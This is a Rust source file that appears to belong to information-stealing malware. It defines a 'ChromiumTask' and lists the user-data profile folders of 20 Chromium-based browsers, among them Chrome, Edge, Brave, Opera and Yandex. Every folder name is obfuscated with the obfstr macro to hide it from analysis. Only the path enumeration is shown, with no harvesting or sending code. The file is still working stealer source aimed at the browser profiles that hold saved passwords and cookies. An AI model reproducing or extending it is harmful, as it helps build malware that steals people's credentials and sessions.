use crate::alloc::string::ToString;
use crate::vec;
use tasks::{composite_task, impl_composite_task_runner, CompositeTask, Task};
use utils::path::Path;
use obfstr::obfstr as s;

pub struct ChromiumTask {
    inner: CompositeTask,
}

impl ChromiumTask {
    pub(crate) fn new() -> Self {
        Self {
            inner: composite_task!()
        }
    }
}

impl_composite_task_runner!(ChromiumTask);

pub(super) struct ChromiumBasedBrowser<'a> {
    name: &'a str,
    user_data: Path
}

impl<'a> ChromiumBasedBrowser<'a> {
    pub(super) fn new(name: &'a str, user_data: Path) -> Self {
        Self { name, user_data }
    }
}

macro_rules! browser {
    ($name:expr, $path:expr) => {
        ChromiumBasedBrowser::new($name, $path)
    };
}

pub(super) fn get_chromium_browsers_paths<'a>() -> [ChromiumBasedBrowser<'a>; 20] {
    let local = Path::localappdata();
    let appdata = Path::appdata();
    let user_data = "User Data";

    [
        browser!("Amingo", &local / s!("Amingo") / user_data),
        browser!("Torch", &local / s!("Torch") / user_data),
        browser!("Kometa", &local / s!("Kometa") / user_data),
        browser!("Orbitum", &local / s!("Orbitum") / user_data),
        browser!("Epic Private", &local / s!("Epic Privacy Browser") / user_data),
        browser!("Cent", &local / s!("CentBrowser") / user_data),
        browser!("Vivaldi", &local / s!("Vivaldi") / user_data),
        browser!("Chromium", &local / s!("Chromium") / user_data),
        browser!("Thorium", &local / s!("Thorium") / user_data),
        browser!("Opera", &local / s!("Opera Software") / s!("Opera Stable")),
        browser!("Opera GX", &appdata / s!("Opera Software") / s!("Opera GX Stable")),
        browser!("7Star", &local / s!("7Star") / s!("7Star") / user_data),
        browser!("Sputnik", &local / s!("Sputnik") / s!("Sputnik") / user_data),
        browser!("Chrome SxS", &local / s!("Google") / s!("Chrome SxS") / user_data),
        browser!("Chrome", &local / s!("Google") / s!("Chrome") / user_data),
        browser!("Edge", &local / s!("Microsoft") / s!("Edge") / user_data),
        browser!("Uran", &local / s!("uCozMedia") / s!("Uran") / user_data),
        browser!("Yandex", &local / s!("Yandex") / s!("YandexBrowser") / user_data),
        browser!("Brave", &local / s!("BraveSoftware") / s!("Brave-Browser") / user_data),
        browser!("Atom", &local / s!("Mail.Ru") / s!("Atom") / user_data),
    ]
}